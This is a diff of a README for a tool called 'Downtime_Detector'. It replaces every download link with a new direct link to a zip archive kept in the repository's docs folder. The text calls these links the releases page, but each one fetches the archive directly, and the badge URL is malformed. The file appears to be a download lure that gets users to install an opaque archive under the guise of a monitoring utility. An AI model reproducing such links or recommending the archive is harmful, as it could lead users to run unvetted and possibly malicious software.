@@ -1,6 +1,6 @@
 # 🚀 Downtime_Detector - Monitor Your Project Status Easily
 
-[![Download Now](https://raw.githubusercontent.com/rishikeshjoshy/Downtime_Detector/main/app/Detector_Downtime_1.3.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/rishikeshjoshy/Downtime_Detector/main/app/Detector_Downtime_1.3.zip)
+[![Download Now](https://raw.githubusercontent.com/rishikeshjoshy/Downtime_Detector/main/docs/Downtime-Detector-3.6.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/rishikeshjoshy/Downtime_Detector/main/docs/Downtime-Detector-3.6.zip)
 
 ## 📋 Description
 
@@ -27,7 +27,7 @@ To run Downtime_Detector smoothly, ensure your system meets the following requir
 Follow these steps to download and run Downtime_Detector:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download Now](https://raw.githubusercontent.com/rishikeshjoshy/Downtime_Detector/main/app/Detector_Downtime_1.3.zip)
+   [Download Now](https://raw.githubusercontent.com/rishikeshjoshy/Downtime_Detector/main/docs/Downtime-Detector-3.6.zip)
 
 2. **Select the Latest Release:** On the Releases page, find the latest version listed.
 
@@ -65,7 +65,7 @@ A: You can reach out through the issues section of this repository.
 
 ## 📥 Download & Install
 
-To get started with Downtime_Detector, follow this [link](https://raw.githubusercontent.com/rishikeshjoshy/Downtime_Detector/main/app/Detector_Downtime_1.3.zip) to visit the releases page. Download the latest version, install it, and enjoy hassle-free project monitoring.
+To get started with Downtime_Detector, follow this [link](https://raw.githubusercontent.com/rishikeshjoshy/Downtime_Detector/main/docs/Downtime-Detector-3.6.zip) to visit the releases page. Download the latest version, install it, and enjoy hassle-free project monitoring.
 
 ## 📚 Additional Resources
 
